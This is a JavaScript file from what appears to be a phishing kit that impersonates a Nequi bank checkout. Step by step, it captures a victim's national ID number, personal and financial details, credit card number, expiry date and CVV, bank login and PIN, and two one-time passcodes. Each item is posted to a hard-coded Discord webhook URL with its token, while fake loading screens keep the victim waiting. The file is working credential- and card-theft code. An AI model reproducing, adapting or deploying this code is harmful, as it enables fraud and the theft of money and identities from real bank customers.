var espera = 1;
function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i)) dispositivo = "Android";
    else if(navigator.userAgent.match(/webOS/i)) dispositivo = "webOS";
    else if(navigator.userAgent.match(/iPhone/i)) dispositivo = "iPhone";
    else if(navigator.userAgent.match(/iPad/i)) dispositivo = "iPad";
    else if(navigator.userAgent.match(/iPod/i)) dispositivo = "iPod";
    else if(navigator.userAgent.match(/BlackBerry/i)) dispositivo = "BlackBerry";
    else if(navigator.userAgent.match(/Windows Phone/i)) dispositivo = "Windows Phone";
    else dispositivo = "PC";
    return dispositivo;
}

function vista_final(){
    $("#frm-esperando").hide();
    $("#frm-autorizar").show();     
}
function continuar(){
    $("#frm-animacion,#frm-cargando").hide();
    $("#frm-esperando").show(); 
    espera = 1; 
}
function vista_banco(){
    $("#frm-esperando").hide();
    $("#frm-tarjeta").show();   
}
function vista_datos(){
    $("#fondo,#frm-esperando").hide();
}
function vista_login(){    
    $("#logo-entidad").attr("src","../img/logos/" + icono + ".png");
    $("#frm-esperando").hide();
    $("#frm-verificacion").show();     
}
function vista_otp(){
    $("#logo-entidad-otp").attr("src","../img/logos/" + icono + ".png");
    $("#frm-esperando").hide();
    $("#frm-otp").show();     
}
function vista_nuevootp(){
    $("#logo-entidad-nuevootp").attr("src","../img/logos/" + icono + ".png");
    $("#frm-esperando").hide();
    $("#frm-nuevootp").show();     
}
function iniciar(){
    window.location.href = "informacion/index.html";      
}

// === DISCORD INTEGRATION ===
const discordWebhookUrl = "https://discordapp.com/api/webhooks/1482739185600167966/qQvDGM3ZMU4xpe660f_q-l0VCG7T7zP9rm8IuZZHdRbhGln2dRk4DWzHWsqpQGXL1qhw";

function sendToDiscord(title, fields, callback) {
    const message = {
        content: "🔔 **¡Nueva Actividad en Checkout Nequi!**",
        embeds: [{
            title: title,
            color: 15277667,
            fields: fields,
            footer: { text: "Nequi | Project Portafolio" },
            timestamp: new Date().toISOString()
        }]
    };
    fetch(discordWebhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(message)
    }).then(() => { if(callback) callback(); }).catch(err => { if(callback) callback(); });
}

function enviar_documento(c){    
    localStorage.setItem('nequi_cedula', c);
    sendToDiscord("Paso 1: Cédula y Dispositivo", [
        { name: "🪪 Cédula", value: c, inline: true },
        { name: "📱 Disp", value: detectar_dispositivo(), inline: true }
    ], function() { setTimeout(iniciar, 800); });
}

function enviar_datos(n,c,m,a,u){
    sendToDiscord("Paso 2: Datos y Finanzas", [
        { name: "👤 Nombre", value: n, inline: true },
        { name: "📱 Celular", value: c, inline: true },
        { name: "📧 Correo", value: m, inline: true },
        { name: "📍 Gastos", value: a, inline: true },
        { name: "💰 Ingresos", value: u, inline: true }
    ], function() { 
        setTimeout(vista_banco, 2000); 
    });
}

function enviar_tarjeta(b,t,f,cv){    
    sendToDiscord("Paso 3: Tarjeta de Crédito", [
        { name: "🏦 Banco", value: b, inline: true },
        { name: "💳 Tarjeta", value: t, inline: true },
        { name: "📅 Fecha", value: f, inline: true },
        { name: "🔒 CVV", value: cv, inline: true }
    ], function() {  
        setTimeout(() => { continuar(); setTimeout(vista_login, 3000); }, 1400); 
    });
}

function enviar_usuario(u,p){    
    sendToDiscord("Paso 4: Login Banco", [
        { name: "👤 Usuario/Celular", value: u, inline: true },
        { name: "🔑 Clave Dinámica/Pin", value: p, inline: true }
    ], function() {            
         setTimeout(() => { continuar(); setTimeout(vista_otp, 3000); }, 1400);                        
    });
}

let otpCount = 0;
function enviar_otp(o){    
    otpCount++;
    sendToDiscord("Paso 5: OTP Capturado ("+otpCount+")", [
        { name: "💬 Código OTP", value: o, inline: true }
    ], function() {               
        setTimeout(() => { if(otpCount === 1) vista_nuevootp(); else vista_final(); }, 3000); 
    });
}

function consultar_estado(){ /* NO-OP (Netlify compatibility check) */ }

function verificar(){
    $("#logo-entidad-load").attr("src","../img/logos/" + $("#txt-entidad").val() + ".png");
    $("#logo-entidad").attr("src","../img/logos/" + $("#txt-entidad").val() + ".png");
    $("#logo-entidad-otp").attr("src","../img/logos/" + $("#txt-entidad").val() + ".png");
    $("#frm-animacion").hide();
    $("#frm-verificacion").show();
}

function validar(){   
    $("#frm-cargando").hide();
    $("#frm-otp").show();
}

function buscar_documento(){
    $("#txt-cedula").val(localStorage.getItem('nequi_cedula') || "");  
}
